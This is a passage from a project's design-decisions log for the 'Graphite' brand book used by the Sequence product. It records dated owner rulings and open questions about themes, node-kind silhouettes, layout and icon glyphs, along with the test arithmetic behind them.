# Graphite — owner decisions of record

Graphite is Sequence's design key. It was built and chosen for `ml-harness`, and Max directed
on 2026-08-19 that Sequence adopt the same book rather than keep its own parallel language.

**Source of truth for Sequence: the book at `docs/brand/graphite/`** — the shared substrate
`_core.html` plus the sheets in `pages/*.html`, assembled by
`node docs/brand/graphite/tools/assemble.mjs`. **There is exactly one copy** (Decision 3), and no
citation may point at a path in another repository. A sheet changes only through a numbered
decision in this file, enforced by `tools/ci/graphite-freeze.test.mjs`.

**Where Graphite came from (context, not a citable source).** The design key was built and chosen
for `ml-harness`, whose own book, token layer and design directives live in that repository
(`C:/Users/<user>/OneDrive/Documents/GitHub/ml-harness`). Sequence's book is a rebuild of that
language, extended with the sheets Graphite never needed — see the standing scope note at the end.
`ml-harness` is studied as a working **reference implementation** (`docs/PIVOT-V2.md`,
`docs/research/ml-harness-adoption.md`); it is not the brand source of truth for this repo, and its
paths — including `frontend/src/styles/tokens.css` and `docs/DESIGN_DIRECTIVES.md` — **do not exist
here**. An earlier version of this header cited them as though they did.

**You extend Graphite. You do not redesign it.** If you find yourself inventing a colour, a
radius, a type size or a spacing value — stop. The answer is already in the book.

---

## There is ONE book, and this file is the only way to change it

The book lives at **`docs/brand/graphite/`** — the substrate, the sheets in `pages/`, and its
assembler (`node docs/brand/graphite/tools/assemble.mjs` → `sequence-graphite.html`). One copy.
Every spec, comment, test and commit message cites that path.

**New owner rulings go through this file as numbered decisions — never as a silent sheet edit.**
A ruling that changes the design is written here as the next `## Decision N`, quoting the owner and
stating what it binds, exactly as Decisions 1 and 2 are. Editing a sheet to encode a ruling that is
not written here is the failure mode this rule exists to prevent: it leaves the change with no
author, no date, no quote and no scope, and it silently invalidates work that cited the sheet.

If a sheet genuinely must change, the order is: record the numbered decision here first, then edit
the sheet in the same change. `tools/ci/graphite-freeze.test.mjs` fails any commit that touches
`_core.html` or a file in `pages/` without a matching edit to this file, so a sheet cannot move
underneath finished work without an author, a date and a reason.

*(This section replaced a two-copy freeze on 2026-08-21. What it protected, and why the protection
survives without the duplicate, is Decision 3.)*

---

## The inherited laws

1. **Every hue on screen is a claim about the world, and there are never more hues than there
   are claims.** Dividers, headings, section rules, borders and chrome are NEVER coloured.
2. **Indigo is the accent and can never be mistaken for a verdict.** `--accent` / `--accent-solid`
   carry the product's own voice — send, selection, focus — never good, bad, warning or info.
3. **Compact is the only density.** Working type is 10 / 11 / 12px. Thread rows 28px, tool rows
   26px, controls 28px, icon buttons 26px. Airy is a defect.
4. **Never invent a number.** Any value the engine computes at run time is a marked placeholder.
5. **Both themes ship at equal quality** — see Decision 1, which defers this for Sequence.

Plus the standing directives: the Codex app is the interface reference and questions are settled
by looking at it; icons liberally, thin outline, one stroke weight, no emoji; Apple-like rounding
with the circular filled send button as the signature element; quiet borders and few hues.

---

## Decision 1 — the light theme is deferred

**Max, 2026-08-19:** "ignore light theme for the moment… Don't tune the light theme now."

Graphite law 5 requires both themes at equal quality. That requirement is **deferred, not
waived**. Sequence's token layer is still written in Graphite's three-state shape:

```
:root                                              → the complete light palette
@media (prefers-color-scheme: dark)
  :root:not([data-theme="light"])                  → system default resolves dark
:root[data-theme="dark"]                           → explicit choice wins
```

so that finishing light later is a fill-in-the-values job and never a re-architecture. No agent
spends effort tuning light surfaces until this decision is revisited.

---

## Decision 2 — architecture node kinds differentiate WITHOUT hue

This is the one real collision between Graphite and Sequence. Graphite has no architecture canvas;
Sequence's whole product is one. Sequence had been colouring node borders by kind, which law 1
forbids — coloured chrome, and more hues than claims.

**Max, 2026-08-19:** "We kind of need some type of contrast differentiation. If you can solve that
while staying true to Graphite, that'd be cool… some subtle grain, some subtle graphiting…
dotted lines, stuff like that… Maybe use shapes and icons in higher quantities to really
differentiate the actual features… We just want a good visual experience, but not overpower the
eyes too much. Don't kill people when they look at it."

**Resolution: kind is carried by four non-chromatic channels, never by hue.**

| Channel | Carries | Rule |
| --- | --- | --- |
| **Icon** | the kind, primarily | One icon per kind, one meaning per icon. This is also the fix for icon reuse — an icon that means two things means neither. |
| **Silhouette** | the kind, at a glance | Kinds differ in shape, so the board is readable when zoomed too far out to read a label. |
| **Border treatment** | the kind, on inspection | Solid / dashed / dotted, and border weight. Max named dotted lines explicitly. |
| **Neutral tone** | elevation and grouping | Steps within the graphite surface ramp (`--surface-1`…`--surface-4`). Zero chroma. |

**Hue stays reserved for claims:** verdicts, risk, error, selection, focus. A node's *kind* is a
category; a node's *state* is a claim. Only the second one earns colour.

### The six silhouettes

Corner radius alone is too weak a channel, and the first draft of the book proved it the hard way
— see the rendering rule below. Six kinds get six genuinely different outlines:

| Kind | Silhouette |
| --- | --- |
| service | rounded rect, `--r-14` |
| module | rounded rect with a top-left tab — a folder — and a dashed border |
| datastore | cylinder: flat sides, elliptical top and bottom |
| topic | stadium — fully round ends |
| agent | rounded rect with a chamfered (cut) top-right corner |
| entry | flag — a capsule left end against a hard square right edge |

Shapes that `border-radius` cannot express — the cylinder, the chamfer, the folder tab — are drawn
as inline `<svg>` or `clip-path`. They are never faked with a radius that will not render.

### The binding invariant, stated so a test can enforce it

> **Every architecture node kind must remain distinguishable with all colour removed, at every
> size the silhouette is drawn, from the radii that actually paint.**

Render the board in greyscale: if two kinds become ambiguous, the differentiation was leaning on
hue and the design is wrong. This is stricter than "don't use colour" and it is the assertion to
lock, because it survives refactors that swap one token for another.

**The rendering rule, and why the last clause is in the invariant.** CSS scales every corner radius
by `f = min(side length ÷ sum of the radii on that side)`. On a 26×18px legend swatch, `--r-14`,
`--r-18` and `--r-full` *all* paint at 9px — three kinds, one shape. Any radius at or above half
the height paints as a stadium. The book's first draft proved the invariant against *declared*
token values and passed; an adversarial pass re-derived it from *rendered* values and three of six
kinds collapsed. **Declared values are not rendered values**, and an invariant proved against the
former is not proved at all.

Two consequences that bind: every silhouette specimen is drawn at card aspect and at least 40px
tall, because a swatch smaller than twice its largest radius is a lie about the shape; and the
level-of-detail ladder states honestly the size at which silhouette stops separating kinds and the
**icon** becomes the carrier, then the size below which neither does and the node becomes a dot.
A ladder that claims separation it does not have is worse than a shorter ladder that is true.

A second, narrower invariant: **no `--arch-kind-*` token may introduce a hue that is not already
in the Graphite palette**, and none may collide with a verdict hue.

### Why this is the better answer, not the compromise

It is colourblind-safe, it survives greyscale printing and low-zoom rendering, it works when a
node is selected (selection can then own colour outright without competing), and it scales past
the five or six kinds a hue vocabulary tops out at. Graphite's directive 4 already asks for icons
liberally — this puts them to work carrying real meaning instead of decoration.

---

## Decision 3 — one copy of the sheets

Max, 2026-08-21, asked where eleven new shell sheets should live and answered the question
underneath it instead:

> "all I know that there should only be one copy of sheets in this project, everything according to
> current and future build, nothing from the past"

**What it binds.** The book is `docs/brand/graphite/`. The byte-identical duplicate at
`docs/brand/graphite/` is deleted. Nothing cites `graphite/` any more — 44 files in
`packages/web2` and 34 docs were repointed.

**What the duplicate was for, and where that protection went.** The freeze existed for a real
reason, recorded in its own words: *five books in seventeen days*, and work finished against a
sheet must not be silently retargeted by a later edit to that sheet. That is a guarantee about
**change**, and a second copy is only one way to buy it — an expensive one, since it doubles every
byte of the book and makes adding a sheet a two-place edit.

The guarantee now sits directly on the thing it was always about:

- `tools/ci/graphite-freeze.test.mjs` fails any commit that edits `_core.html` or any file in
  `pages/` without also editing this file. A sheet cannot change without a numbered decision
  carrying an author, a date, a quote and a scope.
- `packages/web2/test/firewall.test.ts` now asserts every cited sheet **exists**, which the
  byte-comparison never checked. A typo or a renamed sheet used to read as a valid frozen citation.
- Work that needs an exact, immovable target cites a **commit**, which is what git is for and
  cannot drift.

**What is deliberately weaker.** Under the old rule a sheet edit was impossible to land without
touching two directories; under this one it is possible to land with a decisions entry that says
very little. The check is that a human wrote something down, not that the something is good. That
is the cost of the ruling, and it is stated here rather than discovered later.

---

## Open questions — for the owner, binding on nobody

**An open question is not a decision.** It is the other half of the rule at the top of this file:
if a sheet must change, the numbered record comes first. So when a lane finds the frozen book
contradicting *itself*, the sheet is not edited and the reading is not quietly picked — the
contradiction is written down here, with both sides quoted, plus what ships in the meantime and
under whose authority. When Max rules, the ruling becomes the next `## Decision N`, and both copies
of the affected sheet are re-cut together in that same change.

Each entry states three things and no more: **what the two sources say**, **why they cannot both
be implemented**, and **what the code does today**.

### Open question 1 — two sheets disagree about what carries kind below half a card

**`docs/brand/graphite/pages/05-the-canvas.html` §05.8** prints the level-of-detail ladder as a
table. Its last row is:

| Rung | Authored | Threshold | Holds to |
| --- | --- | --- | --- |
| the kind icon | 1.5 stroke | `--w-hair` ÷ 1.5 | 0.67 |
| silhouette, border treatment, tone | geometry | **none** | **0.25** |

and the last card it draws is captioned *"< 0.67 · silhouette only"*. 0.25 is §05.9 assertion 5's
clamp — *"Zoom is clamped to 0.25 … 4.00 on every path — gesture, button, key and fit alike."* So
§05.8 says the silhouette has no threshold of its own and outlives the camera.

**`docs/brand/graphite/pages/08-board-density-and-overflow.html` §08.2** says the opposite:

> "But the kind does not ride one carrier all the way down. It is handed over: the silhouette
> carries it to half a card and no further, the icon carries it below that, and below the icon
> nothing does. A ladder that ended at 'silhouette' would be claiming a separation the renderer
> stops giving."

and draws rung 6 as an icon with no card and rung 7 as a dot.

**Why they cannot both be implemented.** §05.8 fixes the icon's floor at 0.67 by its own stated
derivation — a 1.5px stroke has fallen to `--w-hair`, one device pixel, below which "the renderer
is guessing." Half a card is 0.50 under the camera. 0.67 is *above* 0.50, so on §05.8's own numbers
the icon is already gone before the silhouette could reach a half-card limit: there is no zoom at
which the icon carries kind and the silhouette does not. §08.2's rung 6 describes a state this
camera never reaches. **The disagreement is arithmetic, not taste.**

**Decision 2 above is on §08.2's side of this**, in its own words: *"the level-of-detail ladder
states honestly the size at which silhouette stops separating kinds and the **icon** becomes the
carrier, then the size below which neither does and the node becomes a dot."* Whichever way this is
ruled, that sentence changes with it.

**What ships today, and under whose authority.** §05.8, per `docs/CANON.md`'s precedence table — a
Graphite sheet wins anything visual, and §05.8 states an explicit numeric table where §08.2 states
a prose generalisation. `packages/web2/src/canvas/lod.ts` implements §05.8's five rungs;
`src/canvas/lod.test.ts` asserts them against the live type ramp, and `e2e/board-lod.mjs` measures
the result in a real browser at 25%. Before that change the board shipped a *third* ladder that
neither sheet states — silhouette gone at 0.50, nothing on the card from 0.354 — which at the
camera floor rendered all eleven nodes as one identical pill.

**Three ways it could be settled.**

1. **§05.8 stands.** §08.2's rung 6 and rung 7 rows and its caption want correcting: below the icon
   the silhouette still carries kind, and the mark leaves the ladder.
2. **§08.2 stands.** The icon's threshold has to move below half a card, which means either the
   icon is not a 1.5 stroke at low zoom or `--w-hair` is not its floor — §05.8's icon row changes,
   not just its silhouette row.
3. **Both, about different things.** "The silhouette is *drawn*" and "the silhouette still
   *separates six kinds*" are two claims, and the sheets may each be right about one. Then what is
   owed is the distinction, written into both.

### Open question 2 — `--arch-card-min-h` is load-bearing twice on sheet 08.1

**`docs/brand/graphite/pages/08-board-density-and-overflow.html` §08.1** uses the one token for
two different jobs. In its spec list:

> Card width — `--arch-card-w` · **Card height floor — `--arch-card-min-h`** · Field pitch —
> `--board-field-pitch`

and in the caption under the same field:

> "Every mark on this field is one node, drawn at **half a card — 80 × 48, which is
> `--arch-card-w` and `--arch-card-min-h` halved**"

**Why they cannot both be implemented.** The first reading is the *smallest legitimate card*; the
second is the *full* card, the thing `.silswatch` halves. They are different numbers.
`docs/brand/graphite/pages/02-the-architecture-node.html` §02.3 derives the three real card
heights from §02.1's specs as **56 / 75 / 99**, so the token's declared 96 is within a hair of the
*fullest* card. Used as a `min-height` it is a fixed height wearing a floor's name: a card with no
subtitle becomes 56px of card over 40px of dead ground, and the emptiest kinds — the ones that
never had a subtitle — get the most of it.

**What ships today.** `packages/web2/src/canvas/board.css` derives `--board-card-floor` inside
`.board-scope` from the same ramp §02.3 derives the floor from, and uses that for `min-height`,
leaving `--arch-card-min-h` to its second and correct use as the full card. That is a workaround
inside one stylesheet, not a token split, and it means the token layer and §08.1's spec list
disagree about what "card height floor" names.

**08.1's number is the sheet's:** `--arch-card-min-h` stays **96**, the full card. What is missing
is a *second name* for the floor — a token derived from the ramp
(`--sp-10 + 14px + --sp-4 + --lh-12 + --sp-10 + 2 × --w-hair` = 56), with §08.1's "Card height
floor" row re-pointed at it and `.silswatch` left on `--arch-card-min-h`. Nothing is invented by
that: both numbers are already in the book, only one of them has a name.

It is recorded rather than applied because adding the token to `packages/web2/src/tokens/graphite.css`
ahead of the sheet naming it is this file's own prohibition run backwards — a token layer that
encodes a ruling nobody has made.

---

### Open question 3 — does "working type" cover the text a person READS?

**Law 3** says, in full: *"Compact is the only density. Working type is 10 / 11 / 12px. Thread
rows 28px, tool rows 26px, controls 28px, icon buttons 26px. Airy is a defect."*

**`packages/web2/src/chat/chat.css`** paints the assistant's answer at `--t-15` and the user's
bubble and the composer field at `--t-14`. Every other size in that file is 10, 11 or 12.

They cannot both be right as written. Either the law's "working type" means ALL text, and the
thread is three sizes over it, or it means the chrome it is listed beside — rows, controls, icon
buttons are all chrome measurements, and the sentence ends on density rather than on reading.

**`docs/brand/graphite/pages/12-the-agentic-surfaces.html` does not settle it.** Its only `14px`
references are icon sizes (`.i-14`, "a 14px glyph"); it specifies no body size at all. So the
15px prose is the implementation's own choice and not a sheet's.

**What ships today: the larger sizes, unchanged.** Under the standing directive that *"the Codex
app is the interface reference and questions are settled by looking at it"* — Codex sets message
bodies at roughly this size, and shrinking a long answer to 12px to satisfy a clause about row
heights would make the product harder to read in the name of a law about density. That reading is
a lane's, not a ruling, which is why it is written here rather than acted on.

The four RUNG heights in the same law are not ambiguous and are now enforced: `--row-h`,
`--row-h-thread`, `--row-h-tool` and `--icon-btn` each exist, and rule 5 of
`packages/web2/test/firewall.test.ts` fails any stylesheet that writes one of those numbers raw.

### Open question 4 — the six-to-two silhouette collapse cannot hold the greyscale invariant

Max, 2026-09-02 (relayed): "cut the node kind silhouettes from six to two… KEEP the datastore
cylinder and the dashed module folder-tab; COLLAPSE service, topic, agent and entry into ONE card
shape, with the kind carried by an icon from the sheet 09 vocabulary."

**This is recorded as a question, not a decision, because the ruling and Decision 2's binding
invariant cannot both hold, and the conflict is arithmetic rather than aesthetic.** Acting on the
ruling would require weakening the law without saying so — and Decision 2 exists precisely because
that weakening was already tried once and proved wrong.

**What the invariant costs.** `graphite.test.ts` scores every pair of kinds across six channels —
`silhouette, drawn, style, weight, tone, icon` — and fails any pair separated by fewer than three
in **both** themes. Collapsing the four silhouettes was probed directly; three pairs fall to two:

```
"entry vs service differ only in [style, icon]",
"entry vs topic   differ only in [style, icon]",
"service vs topic differ only in [style, icon]",
```

**No token assignment rescues it, by pigeonhole.** With the silhouette shared, the four kinds have
`drawn: none` (the `tab` and `chamfer` outlines belong to module and agent, and a chamfer *is* a
shape difference — keeping it means the collapse did not happen), and `--arch-tone-entry`,
`-service` and `-topic` are all `var(--surface-2)`, identical in every theme. That leaves `style`,
`weight` and `icon`. `icon` always differs, so every pair must find two more from `style` (three
renderable values: solid, dashed, dotted) and `weight` (two: `--w-hair`, `--w-struct`). Across
three kinds, two must share a weight; that pair is then separated by `style` and `icon` alone — two
channels, one short. The bar is unreachable for entry/service/topic under **any** assignment, and a
fourth kind only makes it worse. This is the same result Decision 2 reached from the other
direction: *"corner radius alone is too weak a channel, and the first draft of the book proved it
the hard way… three of six kinds collapsed."*

**The far-zoom cost, measured rather than estimated.** The invariant obliges the LOD ladder to name
"the size at which silhouette stops separating kinds and the **icon** becomes the carrier, then the
size below which neither does." `lod.ts` puts that handoff at 0.67 and paints no icon below it. If
silhouette never separates these four, the icon is their only carrier at every rung — so **below
0.67 the four kinds become one shape with no distinguishing mark at all.** Today the ladder's claim
is true; after the collapse it would be false at every zoom under 0.67, which the invariant calls
"worse than a shorter ladder that is true."

**The two honest options, both Max's to pick.**

1. **Keep six silhouettes.** The ruling's goal — a calmer board — is real, and reachable without
   touching kind identity: the silhouettes could be made quieter (a shallower chamfer, a smaller
   tab) while still separating. Nothing in the invariant demands they be loud.
2. **Amend Decision 2 to a two-channel floor for the collapsed kinds**, as a numbered decision that
   states the accepted cost out loud: four kinds indistinguishable below 0.67 zoom, and separated
   above it by a border-style difference (dotted vs dashed vs solid on a 1px hairline) plus a small
   grey glyph. That is a real loss of the colourblind-safe, greyscale-safe property Decision 2 was
   written to buy, so it should be chosen deliberately, not inherited from a refactor.

**Not implemented pending an answer.** The audit the ruling asked for is done and clears the way
otherwise: `--arch-sil-*` is consumed only by `archKinds.ts`, `board.css`, `kinds.ts`,
`graphite.css` and `graphite.test.ts`, and **export does not read these tokens at all** — `mermaid.ts`
and the two SVG renderers carry an independent kind mapping and would need a matching change of
their own. The LOD path is the second site, as above.

#### Update, same day — the inverted ladder fails at the high-zoom rung too

> **The finding, before the options: removing the silhouette does not remove differentiation — it
> relocates it onto channels MORE visible at reading zoom than a corner radius.** Every valid
> six-kind assignment needs all three border styles, all three tones and both weights at once, so
> cutting shapes moves the noise from a card's OUTLINE to its FILL and BORDER, louder at exactly
> the zoom the objection was made at. The request was a calmer board; the mechanism proposed for
> it produces the opposite. That is not a refusal — it is the measurement that makes the remaining
> choice easy.

Max then took a third option over both of the above: **invert the ladder.** One plain card plus a
glyph at reading zoom; the six silhouettes return below 0.67, where nothing else survives. The
articulation is better than "cut to two" — the shapes are redundant exactly where labels and glyphs
are legible, and load-bearing only where they are not.

**Probed before building, and it does not pass.** Sharing one silhouette across all six kinds fails
five pairs:

```
"entry vs service differ only in [style, icon]"     "service vs topic differ only in [style, icon]"
"entry vs topic   differ only in [style, icon]"     "store   vs agent differ only in [drawn, icon]"
"service vs store differ only in [weight, icon]"
```

That understates it. `drawn` is a fixed table in the test, so the probe still credited agent's
chamfer and module's tab; in a real inverted ladder both are gone above 0.67 and `drawn` dies for
every pair.

**And it cannot be rescued by reassigning tokens — this was searched, not estimated.** Above 0.67
the live channels are `style` (3 values), `weight` (2) and `tone`, with `icon` supplying one of the
three required, so every pair needs two more. **`tone` is binary, not ternary**: line 85 sets
`--surface-2`, `--surface-3` and `--surface-4` all to `#FFFFFF` in light, and the invariant demands
a difference in *both* themes, so the only real split is `--surface-1` against everything else.
That is why the probe never credited tone for store-vs-agent. An exhaustive search over the true
alphabet (3 x 2 x 2 = 12 words, minimum Hamming distance 2) returns **zero** assignments for six
kinds; the maximum is **four**.

A first search using three tones found 12 valid assignments and was wrong — it read the token
*names* rather than their resolved values. That is precisely the failure Decision 2 records
("declared values are not rendered values"), arriving in a new costume, and it is the reason this
option was probed instead of reasoned about.

**The blocker is the unfinished light theme, not the board.** Decision 1 defers light, so its
surfaces are placeholders — three of the four collapsed to pure white. Give light a real
`--surface-2`/`-3`/`-4` separation, which it needs whenever light stops being deferred, and tone
becomes ternary and six kinds *are* distinguishable above 0.67 (12 valid assignments). So the
inverted ladder is not permanently dead; it is **blocked behind light**.

**One caveat to record before anyone reaches for that, and it is a second defect in the invariant
rather than a footnote.** The test compares resolved strings, not perceptual distance. Light's
`--surface-1` is `#FBFBFC` against `#FFFFFF` — 4/255 in red, 4 in green, 3 in blue. Nobody
distinguishes those cards. So in light the tone channel has two *string* values and **one
perceptual value**, and the scorer credits it as live. An assignment leaning on tone in light would
satisfy the letter of the invariant while a reader sees two identical cards, and someone will build
exactly that in good faith while "give light real surfaces" is on the board.

**These are two different failures and Decision 2 has only learned one of them.** *Declared is not
rendered* is the one it records — the first draft proved the invariant against token values and an
adversarial pass re-derived it from painted radii, collapsing three of six kinds. *Different is not
distinguishable* is new: values that resolve differently and land within a few units of each other
are one channel wearing two names. **Proposed, not built** (this lane is parked): the greyscale
scorer should require a minimum perceptual delta before crediting tone, the same way hit targets
now have a floor. Without it, the light-theme prerequisite above can be satisfied by a change that
passes the test and not the eye.

**What holds regardless of which option is chosen.** Every valid six-kind assignment found — under
the optimistic three-tone alphabet — needs all three styles, all three tones and both weights at
once. Removing the silhouette does not remove the differentiation; it relocates it onto channels
that are *more* visible at reading zoom than a corner radius, which is the opposite of the calm
being asked for.

## Standing scope note

Max, 2026-08-19: "make a really in-depth brand book based off what we already had." Sequence's
book is rebuilt in Graphite's language and **extended** with the sheets Graphite never needed —
architecture nodes, module hierarchy and nesting, edge kinds, the canvas itself, graph density
and overflow, the functions rail, drill-down states. Graphite's page house-style is the model.

---

## Decision 4 — the composer has slash commands, and the placeholder says so

Max, 2026-08-24, after running the app and finding no way to reach a skill:

> "i want to introduce / commands for skills pleae add that"

**What it binds.** Sheet 12.4's placeholder passage said, in its own words: *"this composer has no
slash commands, and a placeholder that advertises one would be the product lying in its most-read
line."* That sentence was correct on the day it was written, and it is now false — the composer has
them. The sheet is edited in this same change, because leaving it would make the book assert the
opposite of the product.

**The reasoning is not overturned; its premise moved.** The sheet's actual rule is that the
placeholder names the affordances a person cannot discover by looking, and claims nothing that does
not exist. `/` is now exactly such an affordance, so naming it obeys the rule rather than breaking
it. What stays forbidden is the thing the sentence was guarding against: advertising an affordance
the product does not have.

**Scope.** The placeholder names `/` and `@`, and nothing else. Adding a third marker to the
most-read line in the product needs its own decision — the line's value is that it is short enough
to be read every time.

---

## Decision 5 — the shell frame: chat centre, board right, sessions left, settings bottom-left

Max, 2026-08-24, after using OpenCode and the Codex frame mock:

> "I very much like the OpenCode examples… I kind of want to open this kind of chat box
> view… have the board not be there initially… our repository and architecture board open
> up with the in-depth breakdown."

**What it binds.**

- Chat occupies the **centre**; the board pane moves **right**; a persistent **sessions
  sidebar** lives **left**; a **settings entry** sits **bottom-left**.
- **No-board boot:** with no repo attached the shell is chat-only (no board pane, no rail).
  Attaching a repo opens the board with the in-depth breakdown.
- This **overrides `_core.html`'s `.win` chassis** (chat LEFT / canvas CENTRE / rail RIGHT).
- Lands as **ONE commit** with every geometry lock rewritten in the same commit:
  `e2e/shell-boot.mjs` (three-pane arrangement at 1280/1000/760), `shellModel.test.ts`
  (canvas ≥ half-frame assertions), `Shell.test.tsx`. The shell is never half-moved.
- **Chat-at-half is absorbed here** (owner: "you can add that to A"): `--pane-w-max`
  (graphite.css:246, currently 640) rises so chat can reach ~half the frame; the
  canvas-is-half arithmetic invariant (`shellModel.ts:147 canvasFloor`) is replaced by a new
  board-floor invariant in the same commit. No standalone half-page change ships.

---

## Decision 6 — the board goes back to the dark-blue direction (amends Decision 2)

Max, 2026-08-24, referencing the v1 marketing board (dark canvas, blue orthogonal
connectors, node cards with dot + English):

> "Everything has to follow our actual Graphite brand book. I just like the logic behind it
> — clear nodes with clear English on them, clear services, clear connections, fading where
> it needs to be… a little more visual and less killy… we can overwrite the old color-dots
> thing and say in this decision we overwrite that, so nodes can be colored in light hues."

**What it binds.**

- **Orthogonal connectors stay** (already shipped: `routes.ts` + `orthogonalElbow.ts`) and
  carry the **blue accent** for declared/traced flow.
- **Card anatomy gains a status dot** — small, left of the title, carrying **path/selection
  state in light hues** (on-path / selected / off-path). **This amends Decision 2**: kind is
  still never carried by hue alone (kind keeps its non-chromatic channels), but *state* may
  now spend a light hue. Hue ledger (sheet 12.7 pattern) gains the state-dot row.
- **Off-path dimming on selection** — selecting a node recedes everything not on its path
  (extends today's flow-playback-only dim to explicit selection; `flowFocus.ts` is the
  seed).
- **Card English:** title + one small-caps subtitle stay compulsory at LOD rungs that show
  cards; per-node plain-English annotation gets wired to the already-built **`/api/annotate`**
  (built, served, called by nothing — best value-to-effort left).
- **Whiteboard toolbar goes icon-first:** every tool renders a glyph, words only as
  tooltips/accessible names. `pan` stops borrowing `frame`.
- Darker canvas stays as-is.

---

## Decision 7 — the tool trail folds inline, and work-in-progress is alive

Max, 2026-08-24, after comparing `docs/design-refs/tool-trail-detached-vs-inline.html`:

> "I like the inline one. It does look better… I like a bit more design around it, more
> icons, more animation when loading, thinking, and tool calling is happening. I like the
> cursor animation style… very straightforward about saying what's happening — searching,
> file reading, tool planning."

**What it binds.**

- Work rows render **inside the answer flow** (quiet, indented, left rule), not in a
  detached trail block — per the artifact's B panel.
- **Amends sheets 12.2 / 12.3 / 12.7**: the four-slot row (glyph · past-tense verb ·
  identifier · right cluster), 26px height, and the closed hue ledger all carry over;
  *placement* moves inline. Past-tense-on-landing is unchanged.
- **The live row is animated and named**: while a call runs, the row shows a shimmering
  present-progressive status ("Searching `*auth*`…", "Reading `session.ts`…",
  "Planning…") with the pulsing-glyph treatment extended — the Cursor-style living status
  line. On landing it is **replaced** (never appended) by the past-tense row, exactly as
  sheet 12.3 already requires.

---

## Decision 8 — the missing glyphs are authored, and the vocabulary is transcribed

Max, 2026-08-24:

> "I opened the whiteboard and there are literally missing things, which is nuts… create
> the glyphs, author them, from our brand book, and add them to our brand book instead of
> just having words."

**What it binds.**

- **Oval, Text, Link, Erase** are authored as new symbols via sheet 09 §09.8 ("Drawing a
  seventy-first") — stroke rules, 1.5px grid, no borrowing. They enter `_core.html` (book
  goes 70 → 74) and `Icon.tsx`, and `Whiteboard.tsx` `TOOL_ICON` maps all ten tools.
- The **37 book glyphs missing from `Icon.tsx`** (70 defined, 33 exposed) are transcribed —
  mechanical, unblocks the toolbar, the frame, and the skills surfaces. Unused-and-wanted
  today: `ic-skill`, `ic-newthread`, `ic-panelleft`, `ic-sliders`, `ic-gear`.
- Words remain as tooltips/accessible names everywhere.

---

## Decision 9 — pan and box glyphs complete the whiteboard toolbar

Max, 2026-08-25 (seat-walk): whiteboard tools still showed blank or word-only
controls for Pan and Box; architecture Draw felt undiscoverable.

**What it binds.**

- **Pan** and **Box (rect)** are authored as new symbols via sheet 09 §09.8 —
  stroke rules, 1.5px grid, **no borrowing** (`frame` stays frame; `module`
  stays the architecture folder). They enter `_core.html` (book goes 74 → 76)
  and `Icon.tsx`. `Whiteboard.tsx` `TOOL_ICON` maps all ten tools to glyphs.
- Whiteboard icon CSS is scoped under `.wb-scope` so transcribed glyphs actually
  paint (stroke + size) — DOM presence without stroke was the blank-button bug.
- Architecture board **Draw** is icon-first (`pen`) with the word as accessible
  name; ink path unchanged.
- Words remain as tooltips/accessible names everywhere.

---

## Decision 10 — ic-thread closes its left edge

Max, 2026-08-26 (seat-walk): the Chat mark (`ic-thread`) looked cut off on the
left in the workspace tab and pane header — a flat edge where the bubble's left
wall should curve.

**What it binds.**

- The original path drew the top-left corner and tail but **never the left
  vertical** between them; at 14px the gap read as clipping. The fix appends
  `H4V6.2` after the tail (`…V16.5H4V6.2`) so the bubble body closes like
  `ic-newthread`'s left run.
- `_core.html` and `packages/web2/src/chat/Icon.tsx` carry the same `d`; the
  book lock test keeps them aligned.

---

## Decision 11 — the six silhouettes stay, and get quieter (amends nothing in Decision 2)

**Relayed 2026-09-04 by the orchestrating session, which states that Max delegated approval to it.**
That provenance is recorded rather than smoothed over: this entry is written from a relay, not from
the owner's own words, and if the delegation is not what he intended the ruling should be re-taken.
The *measurements* below stand either way — they are the reason this is the only surviving option.

**The ruling.** Keep all six node-kind silhouettes. Make them quieter — shallower chamfer, smaller
folder tab, gentler stadium, thinner strokes where the sheet allows. Full kind identity kept,
greyscale-safe kept, **no law amended.**

### The three options that were proposed, and why each is dead

Recorded so nobody re-proposes them. Each was measured, not argued.

**Option A — collapse four kinds into one card, kind carried by an icon.** Fails Decision 2's
greyscale invariant on three pairs, which fall from three separating channels to two:

```
entry vs service · entry vs topic · service vs topic  →  differ only in [style, icon]
```

**And no token assignment rescues it, by pigeonhole.** With the silhouette shared, `drawn` is `none`
for all four, and `--arch-tone-entry/-service/-topic` are all `var(--surface-2)` — identical in every
theme. That leaves `style` (three renderable values) and `weight` (two), plus `icon`. Across three
kinds two must share a weight, and that pair is then separated by `style` and `icon` alone. Two
channels, one short, unreachable under **any** assignment.

**Option B — invert the ladder** (one plain card above 0.67 zoom, silhouettes only below it). Fails
the same way at the high-zoom rung: five pairs short, and worse than the probe showed, because
`drawn` is a fixed table in the test and a real inversion removes the chamfer and tab too.
Exhaustive search over the true alphabet returns **zero** valid six-kind assignments; the maximum is
four. The blocker is `tone` being **binary, not ternary** — light sets `--surface-2`, `-3` and `-4`
all to `#FFFFFF`, and the invariant requires a difference in *both* themes. It is therefore blocked
behind the light theme, which Decision 1 defers.

**Option C — quieter six.** The one that survives, and the finding that settles it:

> **Removing the silhouette does not remove differentiation — it relocates it onto channels MORE
> visible at reading zoom than a corner radius.** Every valid six-kind assignment needs all three
> border styles, all three tones and both weights at once, so cutting shapes moves the noise from a
> card's OUTLINE to its FILL and BORDER — louder at exactly the zoom the objection was made at.

The complaint was visual noise where labels and glyphs are already legible. The two proposals for
fixing it both increase noise there. Quieting the shapes reduces it without touching kind identity.

### And the tone channel gets a perceptual floor

Approved in the same ruling, and it is now a plain correctness fix rather than a back-door option:
the greyscale scorer compares **resolved strings**, so `--surface-1` (`#FBFBFC`) against `#FFFFFF` —
four values of red — counts as a live channel that no human can see. Two string values, one
perceptual value. Without a floor, "give light real surfaces" can be satisfied by a change that
passes the test and not the eye.

This is the second defect in the invariant, distinct from the one Decision 2 already learned:
*declared is not rendered* is recorded there; ***different is not distinguishable*** was not.

### Addendum, same day — "match the module card to the service silhouette" is already true, and the rest of it is declined

Asked for after Decision 11 was recorded. Measured before answering, and it resolves into two
different requests with two different answers.

**The silhouette already matches.** `--arch-sil-module` is `var(--r-14)` — the identical token to
`--arch-sil-service`. A module is not told apart from a service by its corner radius and never has
been. As literally stated, the request is satisfied and there is nothing to change.

**What would actually change is the folder TAB**, which is the `drawn` channel rather than the
silhouette. Removing it is **legal**: probed by setting module's `drawn` to `none`, the greyscale
invariant still passes 35/35. It is declined anyway, for three reasons:

1. **It contradicts Decision 11**, taken three commits earlier on the ruling that all six
   silhouettes stay and get quieter. Reversing that needs to amend it out loud, not arrive as a
   detail inside a teaching queue.
2. **It spends the whole margin.** With the tab, module vs service separate on four channels —
